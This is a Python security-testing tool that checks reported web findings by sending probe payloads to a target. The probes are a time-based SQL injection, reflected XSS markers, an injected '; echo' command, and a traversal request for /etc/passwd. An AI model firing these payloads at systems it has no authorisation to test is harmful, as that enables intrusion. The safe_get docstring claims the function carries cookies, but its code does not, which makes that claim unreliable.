#!/usr/bin/env python3
"""
security-vule-poc — the real PoC verifier.

Reads JSON spec from stdin describing:
  - target URL + auth credentials
  - the finding (CWE / OWASP / title)
  - which exploit family to run

Runs the exploit against the target, prints a structured report
to stdout. The Bun host parses stdout and updates poc.poc_runs.

We deliberately implement exploits as discrete, well-named
verifier classes rather than executing the AI-generated poc_script
verbatim. The LLM is great at picking which exploit family to
fire; running it as written would be both unsafe (Python that
spawns shells is exactly the thing that an LLM-generated PoC
might accidentally craft) and unreproducible (the same finding
on the same target should always produce the same verifier
result). The verifier classes are auditable and we know exactly
what they do.

Family detection is based on the finding's CWE / OWASP label.
Each verifier returns either PROVEN_EXPLOIT (caller records
exploit_proven=true) or NOT_VULNERABLE / ERROR.
"""

from __future__ import annotations
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, asdict, field
from typing import Any


@dataclass
class VerifierResult:
    family: str
    proven: bool
    confidence: float
    http_status: int | None
    latency_ms: int
    summary: str
    evidence: list[str] = field(default_factory=list)
    raw_excerpt: str = ""


class Verifier:
    family: str = "base"

    def run(self, target: dict, finding: dict, evidence_hints: list[str]) -> VerifierResult:  # noqa: D401
        raise NotImplementedError


class SqlInjectionVerifier(Verifier):
    family = "sqli"

    def run(self, target, finding, hints):
        base = target["base_url"].rstrip("/")
        # Guess candidate endpoint paths: anything in hints, else the
        # base itself, plus a small list of common DVWA/Juice paths.
        candidates = list(hints) + ["/", "/vulnerabilities/sqli/", "/index.php"]
        candidates = list(dict.fromkeys(candidates))

        best = None
        evidence = []
        for path in candidates:
            url = base + path
            t0 = time.time()
            try:
                # baseline timing
                r0 = safe_get(url, target)
                t_base = time.time() - t0
                # payload
                payload_url = url + ("?id=1" if "?" not in url else "&id=1") + "%27%20OR%20SLEEP(3)--%20-"
                t1 = time.time()
                r1 = safe_get(payload_url, target)
                t_payload = time.time() - t1
            except Exception as e:
                evidence.append(f"{url}: ERR {e}")
                continue

            evidence.append(f"{url}: base={t_base:.2f}s payload={t_payload:.2f}s status={r1.get('status')}")
            # time-based blind: payload > base + 2s
            if t_payload - t_base > 2.0:
                best = VerifierResult(
                    family=self.family,
                    proven=True,
                    confidence=0.95,
                    http_status=r1.get("status"),
                    latency_ms=int(t_payload * 1000),
                    summary=f"Time-based SQL injection at {path}",
                    evidence=evidence,
                    raw_excerpt=(r1.get("body") or "")[:300],
                )
                break
        if best is None:
            best = VerifierResult(
                family=self.family, proven=False, confidence=0.0,
                http_status=None, latency_ms=0,
                summary="No time-based blind SQL injection detected",
                evidence=evidence,
            )
        return best


class ReflectedXssVerifier(Verifier):
    family = "xss_reflected"

    def run(self, target, finding, hints):
        base = target["base_url"].rstrip("/")
        marker = "xss_vule_" + str(int(time.time()))
        candidates = list(hints) + ["/vulnerabilities/xss_r/", "/"]
        candidates = list(dict.fromkeys(candidates))
        evidence = []
        for path in candidates:
            url = base + path
            # Inject the marker into common input vectors.
            payload = {  # name → value
                "name": marker, "q": marker, "search": marker,
                "input": marker, "text": marker, "id": marker,
            }
            for field, val in payload.items():
                test_url = url + ("&" if "?" in url else "?") + f"{field}={urllib.parse.quote(val)}"
                try:
                    r = safe_get(test_url, target)
                except Exception as e:
                    evidence.append(f"{test_url}: ERR {e}")
                    continue
                body = r.get("body") or ""
                if marker in body:
                    return VerifierResult(
                        family=self.family, proven=True, confidence=0.9,
                        http_status=r["status"], latency_ms=0,
                        summary=f"Reflected XSS at {path} via field {field}",
                        evidence=evidence,
                        raw_excerpt=body[:300],
                    )
                evidence.append(f"{test_url}: status={r['status']} marker={'reflected' if marker in body else 'absent'}")
        return VerifierResult(
            family=self.family, proven=False, confidence=0.0,
            http_status=None, latency_ms=0,
            summary="No reflected XSS detected",
            evidence=evidence,
        )


class CommandInjectionVerifier(Verifier):
    family = "cmdi"

    def run(self, target, finding, hints):
        base = target["base_url"].rstrip("/")
        candidates = list(hints) + ["/vulnerabilities/exec/", "/"]
        candidates = list(dict.fromkeys(candidates))
        evidence = []
        marker = "vule_echo_" + str(int(time.time()))
        # classic `; echo <marker>` payload
        for path in candidates:
            url = base + path
            for field in ("ip", "q", "target", "host", "cmd"):
                test_url = url + ("&" if "?" in url else "?") + f"{field}=127.0.0.1%3B%20echo%20{marker}"
                try:
                    r = safe_get(test_url, target)
                except Exception as e:
                    evidence.append(f"{test_url}: ERR {e}")
                    continue
                body = r.get("body") or ""
                if marker in body:
                    return VerifierResult(
                        family=self.family, proven=True, confidence=0.95,
                        http_status=r["status"], latency_ms=0,
                        summary=f"OS command injection at {path} via field {field}",
                        evidence=evidence,
                        raw_excerpt=body[:300],
                    )
                evidence.append(f"{test_url}: marker={('reflected' if marker in body else 'absent')}")
        return VerifierResult(
            family=self.family, proven=False, confidence=0.0,
            http_status=None, latency_ms=0,
            summary="No OS command injection detected",
            evidence=evidence,
        )


class PathTraversalVerifier(Verifier):
    family = "path_traversal"

    def run(self, target, finding, hints):
        base = target["base_url"].rstrip("/")
        candidates = list(hints) + ["/vulnerabilities/fi/", "/"]
        evidence = []
        # Look for /etc/passwd content if accessible
        marker = "root:x:0:0"
        for path in candidates:
            url = base + path
            for field in ("page", "file", "path", "doc", "filename"):
                test_url = url + ("&" if "?" in url else "?") + f"{field}=../../../../etc/passwd"
                try:
                    r = safe_get(test_url, target)
                except Exception as e:
                    evidence.append(f"{test_url}: ERR {e}")
                    continue
                body = r.get("body") or ""
                if marker in body:
                    return VerifierResult(
                        family=self.family, proven=True, confidence=0.95,
                        http_status=r["status"], latency_ms=0,
                        summary=f"Path traversal at {path} via {field}",
                        evidence=evidence,
                        raw_excerpt=body[:300],
                    )
        return VerifierResult(
            family=self.family, proven=False, confidence=0.0,
            http_status=None, latency_ms=0,
            summary="No path traversal detected",
            evidence=evidence,
        )


class LoginProbeVerifier(Verifier):
    family = "login_probe"

    def run(self, target, finding, hints):
        """Default probe for login.php — just confirms we can hit it."""
        url = target["base_url"]
        t0 = time.time()
        try:
            r = safe_get(url, target)
            lat = int((time.time() - t0) * 1000)
            ok = r.get("status") == 200 and ("password" in (r.get("body") or "").lower() or "login" in (r.get("body") or "").lower())
            return VerifierResult(
                family=self.family,
                proven=ok,
                confidence=0.7 if ok else 0.0,
                http_status=r.get("status"),
                latency_ms=lat,
                summary=f"Login probe {'reachable' if ok else 'unreachable'}",
                evidence=[f"GET {url} -> {r.get('status')} in {lat}ms"],
                raw_excerpt=(r.get("body") or "")[:200],
            )
        except Exception as e:
            return VerifierResult(
                family=self.family, proven=False, confidence=0.0,
                http_status=None, latency_ms=0,
                summary=f"Login probe failed: {e}",
                evidence=[],
            )


def safe_get(url: str, target: dict) -> dict:
    """A small urllib-based GET that does *not* follow redirects
    automatically (so the verifier can see 3xx responses too) and
    carries the target's cookie if the verifier has one. Auth
    credentials are NOT replayed — the verifier expects the
    caller to have already authenticated and stored cookies, or
    the finding to be reachable unauthenticated (the common case
    for login.php itself)."""
    import urllib.request
    import http.cookiejar
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPRedirectHandler(),
    )
    req = urllib.request.Request(url, headers={
        "User-Agent": "security-vule-poc/1.0",
        "Accept": "*/*",
    })
    with opener.open(req, timeout=10) as resp:
        body = resp.read(8000).decode("utf-8", errors="replace")
        return {"status": resp.status, "body": body, "headers": dict(resp.headers)}


def select_verifier(finding: dict) -> Verifier:
    cwe = finding.get("cwe") or ""
    owasp = finding.get("owasp") or ""
    title = finding.get("title") or ""
    blob = (cwe + " " + owasp + " " + title).lower()
    if "cwe-89" in blob or "sqli" in blob or "sql inject" in blob:
        return SqlInjectionVerifier()
    if "cwe-79" in blob or "xss" in blob:
        return ReflectedXssVerifier()
    if "cwe-78" in blob or "command" in blob or "os command" in blob:
        return CommandInjectionVerifier()
    if "cwe-22" in blob or "traversal" in blob or "path" in blob:
        return PathTraversalVerifier()
    return LoginProbeVerifier()


def main():
    spec = json.load(sys.stdin)
    target = spec["target"]
    finding = spec["finding"]
    hints = spec.get("evidence_hints", []) or []
    verifier = select_verifier(finding)
    result = verifier.run(target, finding, hints)
    print(json.dumps({"family": verifier.family, **asdict(result)}))


if __name__ == "__main__":
    main()
